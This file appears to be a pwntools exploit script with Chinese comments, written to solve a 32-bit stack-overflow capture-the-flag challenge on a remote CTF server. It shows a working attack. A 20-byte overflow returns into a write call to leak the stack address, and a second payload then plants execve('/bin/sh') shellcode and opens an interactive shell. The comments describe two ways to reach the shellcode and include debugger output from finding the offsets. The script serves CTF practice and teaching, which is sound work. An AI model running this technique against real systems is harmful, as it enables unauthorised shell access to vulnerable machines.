from pwn import *


r = remote('node5.buuoj.cn', 28616)
context.log_level = 'debug'
context.arch = 'i386'

'''
.text:08048087 89 E1                       mov     ecx, esp        ; addr
.text:08048089 B2 14                       mov     dl, 14h         ; len
.text:0804808B B3 01                       mov     bl, 1           ; fd
.text:0804808D B0 04                       mov     al, 4
.text:0804808F CD 80                       int     80h             ; LINUX - sys_write(1, esp, 0x14)
.text:08048091 31 DB                       xor     ebx, ebx
.text:08048093 B2 3C                       mov     dl, 3Ch ; '<'
.text:08048095 B0 03                       mov     al, 3
.text:08048097 CD 80                       int     80h             ; LINUX - sys_read(0, esp, 0x3C)
.text:08048099             ; 10:   return result;
.text:08048099 83 C4 14                    add     esp, 14h
.text:0804809C C3                          retn
'''
'''
Let's start the CTF:aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
Program received signal SIGSEGV, Segmentation fault.
0x61616166 in ?? ()
pwndbg> cyclic -l 0x61616166
Finding cyclic pattern of 4 bytes: b'faaa' (hex: 0x66616161)
Found at offset 20
'''
# 动态调试得偏移量为: 20
# 思路为：溢出跳到write函数泄露esp的地址，再通过程序正常流程执行到read函数输入shellcode到esp上即可。
write_addr = 0x8048087
# 由于使用的内平栈，没有ebp，覆盖完buf后就是ret
payload = b'A' * 20 + p32(write_addr)
r.sendafter(b'CTF:', payload)
esp_addr = u32(r.recv(4))  # 0xff94b10a
print(hex(esp_addr))

# shellcode = asm(shellcraft.sh())
'''
strr = '//bin/sh'
res = [strr[i:i+4][::-1].encode().hex() for i in range(0, len(strr), 4)]
print(res)  # ['6e69622f', '68732f2f']  ['69622f2f', '68732f6e']
'''
'''
# execve("/bin/sh",NULL,NULL)
该程序是 32 位
系统调用号，即 eax 应该为 0xb
第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。
第二个参数，即 ecx 应该为 0
第三个参数，即 edx 应该为 0
'''
shellcode = '''
xor eax, eax
xor ecx, ecx
push ecx
push 0x68732f6e
push 0x69622f2f
mov ebx, esp
xor edx, edx
mov eax, 0xb
int 0x80
'''
# gdb.attach(r)
'''
# =================== 方法1：溢出后ret到指定shellcode的地址执行 ================
# 通过gdb调试程序，寻找下一次read输入后esp的地址与泄露的esp地址距离是多少，因为泄露的地址是随机但是相对位置是不变的。
1、通过上一步泄露的esp地址为：0xffad4760
2、输入第二次read构造payload = b'B' * 20 + b'CCCC'进行动态调试：
    pwndbg> stack 10
    00:0000│ ecx esp 0xffad475c ◂— 0x42424242 ('BBBB')
    ... ↓            4 skipped
    05:0014│         0xffad4770 ◂— 0x43434343 ('CCCC')
    06:0018│         0xffad4774 —▸ 0xffad52aa ◂— 'QT_ACCESSIBILITY=1'
    07:001c│         0xffad4778 —▸ 0xffad52bd ◂— 'COLORTERM=truecolor'
    08:0020│         0xffad477c —▸ 0xffad52d1 ◂— 'XDG_CONFIG_DIRS=/etc/xdg/xdg-ubuntu:/etc/xdg'
    09:0024│         0xffad4780 —▸ 0xffad52fe ◂— 'XDG_MENU_PREFIX=gnome-'
    pwndbg> distance 0xffad4774 0xffad4760
    0xffad4774->0xffad4760 is -0x14 bytes (-0x5 words)
3、计算得到第二次溢出后shellcode开始写入的位置（这里为CCCC的下一处地址）与泄露的esp地址距离是0x14
'''
#          溢出offset   ret到shellcode的地址   写入shellcode
payload2 = b'A' * 20 + p32(esp_addr + 0x14) + asm(shellcode)

# =================== 方法2：直接输入shellcode 再ret到shellcode开头的位置 ================
'''
len(asm(shellcode)) => 26, 光shellcode的长度都有26，明显超过了原本的溢出需要的长度20，为什么还可以这样做呢？
原因就在于反汇编代码的最后一段有一条：
.text:08048099 83 C4 14                    add     esp, 14h
.text:0804809C C3                          retn
他把esp的地址抬高了0x14，即将esp往回挪动了20个长度，这样溢出需要的总长度就变成：20(原本的溢出需要的长度)+20(add esp,14h)+4(ret)=44
溢出完成之后，ret到输入开头的地址, 调试第一次read输入的开头地址与esp地址的距离：
    pwndbg> search 'AAAA'
    Searching for byte: b'AAAA'
    [stack]         0xfffbbcc4 0x41414141 ('AAAA')
    [stack]         0xfffbbcc8 0x41414141 ('AAAA')
    [stack]         0xfffbbccc 0x41414141 ('AAAA')
    [stack]         0xfffbbcd0 0x41414141 ('AAAA')
    [stack]         0xfffbbcd4 0x41414141 ('AAAA')
    pwndbg> distance 0xfffbbcc4（第一输入的地址） 0xfffbbce0（esp泄露地址）
    0xfffbbcc4->0xfffbbce0 is 0x1c bytes (0x7 words)
第一次read输入的开头地址与esp地址的距离为0x1C
'''
# payload2 = asm(shellcode) + b'A' * (44 - 26) + p32(esp_addr - 0x1C)
r.sendline(payload2)
r.interactive()
